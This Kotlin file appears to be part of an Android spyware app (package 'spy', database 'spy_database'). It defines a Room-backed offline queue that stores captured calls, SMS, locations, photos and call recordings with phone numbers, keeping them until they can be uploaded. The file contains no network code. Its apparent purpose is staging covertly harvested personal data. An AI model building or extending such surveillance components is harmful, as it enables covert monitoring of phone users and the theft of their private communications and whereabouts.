package com.gauravhanna.spy.utils

import android.content.Context
import androidx.room.*
import kotlinx.coroutines.flow.Flow

// ========== ENTITY ==========
@Entity(tableName = "offline_data")
data class OfflineData(
    @PrimaryKey(autoGenerate = true)
    val id: Long = 0,
    val type: String,  // "call", "sms", "location", "photo", etc.
    val data: String,  // JSON string of data
    val timestamp: Long = System.currentTimeMillis(),
    var retryCount: Int = 0
)

// ========== DAO ==========
@Dao
interface OfflineDataDao {
    @Insert
    suspend fun insert(data: OfflineData)

    @Query("SELECT * FROM offline_data ORDER BY timestamp ASC")
    fun getAllPending(): Flow<List<OfflineData>>

    @Query("SELECT * FROM offline_data ORDER BY timestamp ASC LIMIT :limit")
    suspend fun getPendingData(limit: Int): List<OfflineData>

    @Delete
    suspend fun delete(data: OfflineData)

    @Update
    suspend fun update(data: OfflineData)

    @Query("DELETE FROM offline_data WHERE retryCount > 5")
    suspend fun deleteFailed()

    @Query("SELECT COUNT(*) FROM offline_data")
    suspend fun getCount(): Int
}

// ========== DATABASE ==========
@Database(
    entities = [OfflineData::class],
    version = 1,
    exportSchema = false
)
abstract class AppDatabase : RoomDatabase() {
    abstract fun offlineDataDao(): OfflineDataDao

    companion object {
        @Volatile
        private var INSTANCE: AppDatabase? = null

        fun getInstance(context: Context): AppDatabase {
            return INSTANCE ?: synchronized(this) {
                val instance = Room.databaseBuilder(
                    context.applicationContext,
                    AppDatabase::class.java,
                    "spy_database"
                ).build()
                INSTANCE = instance
                instance
            }
        }
    }
}

// ========== OFFLINE QUEUE MANAGER ==========
object OfflineQueue {

    suspend fun addData(context: Context, type: String, data: String) {
        val db = AppDatabase.getInstance(context)
        val offlineData = OfflineData(
            type = type,
            data = data,
            timestamp = System.currentTimeMillis()
        )
        db.offlineDataDao().insert(offlineData)
    }

    suspend fun getPendingData(context: Context, limit: Int = 50): List<OfflineData> {
        val db = AppDatabase.getInstance(context)
        return db.offlineDataDao().getPendingData(limit)
    }

    suspend fun removeData(context: Context, data: OfflineData) {
        val db = AppDatabase.getInstance(context)
        db.offlineDataDao().delete(data)
    }

    suspend fun incrementRetryCount(context: Context, data: OfflineData) {
        val db = AppDatabase.getInstance(context)
        val updated = data.copy(retryCount = data.retryCount + 1)
        db.offlineDataDao().update(updated)

        // Delete if retry count exceeds 5
        if (updated.retryCount > 5) {
            db.offlineDataDao().delete(updated)
        }
    }

    suspend fun getPendingCount(context: Context): Int {
        val db = AppDatabase.getInstance(context)
        return db.offlineDataDao().getCount()
    }

    // For call recordings
    suspend fun addRecording(context: Context, filePath: String, phoneNumber: String, timestamp: Long) {
        val data = """{"filePath":"$filePath","phoneNumber":"$phoneNumber","timestamp":$timestamp}"""
        addData(context, "recording", data)
    }
}